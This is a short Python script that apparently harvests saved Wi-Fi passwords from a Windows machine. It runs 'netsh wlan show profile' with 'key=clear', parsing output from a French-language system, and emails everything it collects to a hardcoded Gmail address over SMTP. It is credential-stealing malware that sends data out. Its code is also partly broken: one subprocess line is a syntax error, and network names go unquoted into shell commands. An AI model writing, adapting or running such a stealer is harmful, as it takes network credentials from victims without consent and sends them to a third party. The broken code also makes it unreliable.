import subprocess
import smtplib
import re

def send_mail(email, password, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

command = "netsh wlan show profile"
try:#excute
    networks = subprocess.check_output(command, shell=True, encoding='utf-8', errors='ignore')
    networks_names_list = re.findall(r"Profile Tous les utilisateurs\s*:\s*(.*)", networks)
    result = ""

    for network_name in networks_names_list:
        command = "netsh wlan show profile " + network_name + " key=clear"
        current_result = subprocess.check_output(command, encoding='utf-8'), errors='ignore'
        result += current_result
    #report
    send_mail("olivercrack098@gmail.com", "YOUR_APP_PASSWORD", result)
except Exception as e:
    print(f"An error occurred: {e}")
